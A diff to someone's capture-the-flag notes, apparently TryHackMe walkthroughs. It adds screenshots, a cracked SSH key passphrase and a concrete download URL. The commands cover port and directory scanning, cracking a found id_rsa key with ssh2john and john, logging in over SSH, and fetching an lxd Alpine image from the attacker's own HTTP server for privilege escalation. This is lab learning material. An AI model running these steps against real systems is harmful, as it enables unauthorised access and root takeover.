@@ -678,7 +678,7 @@ cat root.txt
 nmap -sC -sV <IP>
 ```
 
-![enum result](Assets/9.png)
+![enum result](NPT/Assets/9.png)
 
 We found at port 113 that we have a key here
 
@@ -687,7 +687,7 @@ If we go there we are automatically downloaded a file called key
 
 ##### Now we cannot do cat into it
 
-![enum result](Assets/10.png)
+![enum result](NPT/Assets/10.png)
 
 Let us run strings into it
 
@@ -1833,9 +1833,13 @@ gobuster dir -u <URL> -w <wordlist>
 
 We found a page called /uploads
 
+![[THM/Assets/9.png]]
+
 We found 3 things in that which are dict1.lst -> dictionary, manifesto -> waste thing and third being an image called meme.jpg
 
 We also found another file called /secret
+
+![[THM/Assets/10.png]]
 
 I found its rsa key so let us login, save name as id_rsa
 
@@ -1847,6 +1851,12 @@ ssh2john id_rsa > file.hash
 john file.hash --wordlist=rockyou.txt
 ```
 
+We got our passphrase 
+
+```
+letmein
+```
+
 ```
 chmod 600 id_rsa
 ```
@@ -1854,6 +1864,8 @@ chmod 600 id_rsa
 ```
 ssh -i id_rsa john@<IP>
 ```
+
+![[Pasted image 20260226114835.png]]
 
 Now we are logged in as john
 
@@ -1896,7 +1908,7 @@ python -m http.server 3030
 ```
 
 ```
-wget http://<IP>/alpine-v3.23-x86_64-20260225_2113.tar.gz
+wget http://192.168.132.222:3030/lxd-alpine-builder/alpine-v3.23-x86_64-20260225_2113.tar.gz
 ```
 
 
